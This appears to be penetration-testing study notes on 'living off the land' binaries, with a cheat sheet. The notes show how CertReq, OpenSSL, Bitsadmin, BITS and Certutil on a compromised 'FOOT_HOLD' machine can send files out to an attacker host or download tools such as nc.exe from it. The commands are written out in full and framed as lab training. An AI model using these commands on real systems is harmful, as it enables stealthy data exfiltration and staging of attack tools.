## 1. Introduction

Every technique covered in earlier sections has relied on a tool doing roughly the job it was designed for — `curl` downloading files, `scp` copying files, PowerShell's `WebClient` fetching URLs. This section is different: it's about repurposing tools for something well outside their original intent. A certificate-management utility being used to exfiltrate a file. An encryption toolkit being used as a makeshift file transfer channel. This is the essence of "living off the land."

**Machine labels used in this section:**

| Label | Role |
|---|---|
| **FOOT_HOLD** | The compromised/target machine, where the LOLBin actually runs |
| **HACKER** (a.k.a. Pwnbox) | Your own attack machine, listening for or hosting the transferred file |

---

## 2. What Are LOLBins?

**LOLBins** stands for **"Living off the Land binaries"** — a term to call programs that attackers can repurpose to do things well beyond what they were originally built for.

**The core idea**: instead of bringing in obviously suspicious custom tools, an attacker uses software that's *already* legitimately installed on the system — meaning its presence alone raises no red flags.

Two community-maintained websites catalog these binaries:
- [LOLBAS Project](https://lolbas-project.github.io/) — focused on Windows binaries
- [GTFOBins](https://gtfobins.org/) — focused on Linux binaries

Both sites organize entries by the kind of action a binary can be abused to perform, including:
- **Download**
- **Upload**
- **Command Execution**
- **File Read**
- **File Write**
- **Bypasses** (getting around security restrictions)

This section focuses specifically on the **download** and **upload** categories, with a worked example from each project.

## 3. LOLBAS Example: Uploading with CertReq.exe (Windows)

<img width="1280" height="811" alt="image" src="https://github.com/user-attachments/assets/ec432a65-86c9-4e21-9602-9a2ee6689442" />

**CertReq.exe** is a built-in Windows utility normally used to request and manage digital certificates (the kind used for HTTPS, code signing, and similar purposes). On LOLBAS, searching for `/upload` or `/download` surfaces binaries — including CertReq — that can be abused for file transfer despite that having nothing to do with their intended purpose.

**Step 1 — On HACKER: start listening for an incoming connection with Netcat.**

`CertReq` is about to connect out to this listener:
```
$ sudo nc -lvnp 8000
```
*(Same Netcat listening syntax covered in earlier sections: listen, verbose, don't resolve hostnames, on port 8000.)*

**Step 2 — On FOOT_HOLD: use CertReq.exe to "upload" a file by POSTing it to the listener.**
```
C:\public> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
*`-Post` tells CertReq to send its request using HTTP POST rather than its normal certificate-enrollment behavior. `-config` specifies the target URL (here, HACKER's address and port). The final argument, `c:\windows\win.ini`, is the file CertReq reads and sends as the body of that POST request — in this case, a harmless Windows configuration file used purely as a demonstration target. The timeout error shown is expected and not a failure: CertReq is waiting for a proper certificate-server response that Netcat (which isn't an actual certificate server) will never send — but by the time this error appears, the file's contents have already been transmitted.*

**Step 3 — Back on HACKER: read the file's contents out of the Netcat session.**
```
listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
*Netcat simply prints whatever it receives — here, that's the raw HTTP POST request CertReq generated, headers and all, followed by the actual contents of `win.ini` at the bottom. From here, the file's contents can be copy-pasted out of the terminal and saved manually (the same general "catch it by hand" pattern used earlier in the Windows base64-over-Netcat upload example).*

> **Troubleshooting note:** if `certreq.exe` throws an error about an unrecognized parameter, the installed version may simply be too old to support `-Post`. Updating to a newer Windows version (or finding a machine with a newer CertReq build) resolves this.

## 4. GTFOBins Example: Transferring Files with OpenSSL (Linux)

<img width="1241" height="944" alt="image" src="https://github.com/user-attachments/assets/75e11cf6-8e0f-488e-b1be-cc096be78c86" />

GTFOBins catalogs Linux binaries the same way LOLBAS does for Windows. Searching with `+file download` or `+file upload` filters the site down to binaries capable of those specific actions.

**OpenSSL** is the example used here — the same toolkit covered in the earlier notes on encrypting files. It's extremely common (often pulled in as a dependency of other software, not just installed deliberately), and it turns out it can also be repurposed to send files in a style similar to Netcat, but with the added benefit of encrypting the connection along the way.

**Step 1 — On HACKER: generate a self-signed certificate and private key.**
```
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```
*`-newkey rsa:2048` generates a new 2048-bit RSA private key, saved by `-keyout key.pem`. `-x509 -days 365` tells OpenSSL to immediately create a self-signed certificate (valid for 365 days) rather than just a certificate *request* that would normally need to be signed by someone else. `-nodes` means the private key won't be encrypted with its own passphrase. `-out certificate.pem` is where the resulting certificate gets saved. The interactive prompts that follow ask for identifying details to embed in the certificate — in a lab or testing context, these can mostly be left blank by pressing Enter.*

**Step 2 — On HACKER: start an encrypted server, feeding it the file to send.**
```
$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
*`s_server` runs OpenSSL as a basic TLS (encrypted) server. `-quiet` suppresses extra diagnostic output. `-accept 80` sets the port to listen on (port 80 here). `-cert` and `-key` point to the certificate and private key generated in Step 1, which is what makes this connection encrypted rather than plaintext. The `<` redirect feeds the local file `/tmp/LinEnum.sh` in as the data to send to whoever connects — this is the exact same "pipe the file in as input" pattern used with Netcat in earlier sections, just wrapped in TLS encryption this time.*

**Step 3 — On FOOT_HOLD: connect to the server and receive the file.**
```
$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
*`s_client` is OpenSSL's TLS client mode — the counterpart to `s_server`. `-connect` specifies the address and port to connect to (here, `10.10.10.32` represents HACKER's address). `-quiet` again keeps the output clean. The `>` redirect saves whatever data comes back from the connection into a local file named `LinEnum.sh` — completing the download.*

> **Why this matters over plain Netcat:** because this transfer happens over TLS (the same encryption technology behind HTTPS), the file's contents are protected from anyone passively monitoring network traffic in between — directly tying back into the "Protected File Transfers" material covered earlier, but achieved here using a tool most systems already have installed rather than a dedicated encryption step beforehand.

## 5. Other Common Living-off-the-Land Tools

### 5.1 Bitsadmin / BITS

**BITS (Background Intelligent Transfer Service)** is a built-in Windows service designed to download files from HTTP sites or SMB shares in a way that's considerate of the user's current workload — it monitors network and host utilization and throttles itself to avoid noticeably slowing down whatever else the user is doing. This same "quiet, background-friendly" design is exactly what makes it appealing to abuse: a BITS-based download can blend into normal background Windows activity far more easily than a sudden spike in web traffic from an obviously unusual process.

**Using the bitsadmin command-line tool directly, on FOOT_HOLD:**
```
PS C:\public> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Public\nc.exe
```
*`bitsadmin /transfer` starts a new BITS job, named `wcb` here (job names are arbitrary labels you choose). `/priority foreground` tells BITS to treat this download with normal priority instead of its usual low-impact background throttling, so it completes promptly rather than trickling in slowly. The URL (`http://10.10.15.66:8000/nc.exe`, representing a file hosted on HACKER) is the source, and the final path is where the downloaded file gets saved locally.*

**Using PowerShell's BITS integration instead, also on FOOT_HOLD:**
```
PS C:\public> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
*`Import-Module bitstransfer` loads PowerShell's BITS-related cmdlets. `Start-BitsTransfer -Source ... -Destination ...` then performs the same kind of download, but through PowerShell's own interface, which additionally supports things like specifying credentials or routing through a particular proxy server if needed.*

### 5.2 Certutil

**Certutil** is a built-in Windows utility for managing digital certificates — available on every version of Windows — which has long been popular as an improvised file downloader, essentially functioning as a stand-in `wget` for Windows.

```
C:\public> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
*`-verifyctl` invokes a certificate-trust-list verification function that, as a side effect, causes Certutil to fetch whatever URL is provided. `-split` and `-f` are supporting flags that control how the retrieved data is handled and force the operation to proceed. The practical effect is that the file at the given URL (hosted on HACKER) ends up downloaded onto FOOT_HOLD.*

> **Important limitation:** this technique is now well known enough that Windows' built-in **Antimalware Scan Interface (AMSI)** — a system that lets security software inspect script and command behavior at runtime — actively flags this specific pattern of Certutil usage as malicious. In other words, this particular LOLBin technique is likely to get caught by modern, properly configured endpoint security, even though the binary itself is completely legitimate.

## 7. Cheat Sheet

| Goal | Tool | Run on | Key Command |
|---|---|---|---|
| Look up a Windows LOLBin | — | — | Browse LOLBAS, filter by `/download` or `/upload` |
| Look up a Linux LOLBin | — | — | Browse GTFOBins, filter by `+file download` or `+file upload` |
| "Upload" a file via CertReq | certreq.exe | target | `certreq.exe -Post -config http://IP:PORT/ C:\path\to\file` |
| Catch the uploaded file | nc | attacker | `sudo nc -lvnp PORT` |
| Create a self-signed cert | openssl | attacker | `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem` |
| Serve a file over TLS | openssl | attacker | `openssl s_server -quiet -accept PORT -cert certificate.pem -key key.pem < file` |
| Download that file over TLS | openssl | target | `openssl s_client -connect IP:PORT -quiet > file` |
| Download via Bitsadmin (CLI) | bitsadmin | target | `bitsadmin /transfer JOBNAME /priority foreground URL localpath` |
| Download via BITS (PowerShell) | PowerShell | target | `Import-Module bitstransfer; Start-BitsTransfer -Source URL -Destination localpath` |
| Download via Certutil | certutil | target | `certutil.exe -verifyctl -split -f URL` *(flagged by AMSI)* |

## 8. Big-Picture Takeaways

1. **The defining trait of a LOLBin is trust, not capability.** CertReq, Certutil, and Bitsadmin aren't powerful hacking tools — they're ordinary, pre-installed Windows utilities. Their value to an attacker comes entirely from the fact that their presence and use look completely normal.
2. **LOLBAS and GTFOBins exist as structured, searchable references for this exact purpose.** Rather than memorizing every possible abusable binary, knowing these two catalogs — and how to search them by capability (download, upload, execution, etc.) — is the more durable, reusable skill.
3. **"Working as designed" and "exploitable" aren't opposites.** CertReq's HTTP POST feature exists for legitimate certificate enrollment; OpenSSL's TLS client/server modes exist for securing real services. Both get repurposed here without any flaw or bug being involved — just a creative reinterpretation of a legitimate feature.
4. **Encryption can come along for the ride, even in an improvised technique.** The OpenSSL `s_server`/`s_client` example shows that living-off-the-land doesn't have to mean plaintext — reusing a tool's built-in TLS support can quietly provide the same protection discussed in the Protected File Transfers notes, without a separate encryption step.
5. **Being well-known cuts both ways.** Certutil's popularity as an improvised downloader is exactly why modern defenses like AMSI now specifically watch for it — a technique's effectiveness tends to decay as it becomes widely documented and defended against, which is worth factoring into any real operational decision.
6. **Error messages aren't always failures.** The CertReq timeout error is a good reminder to understand *why* a tool is erroring before assuming a technique didn't work — in that case, the file had already been sent before the (expected, harmless) timeout occurred.
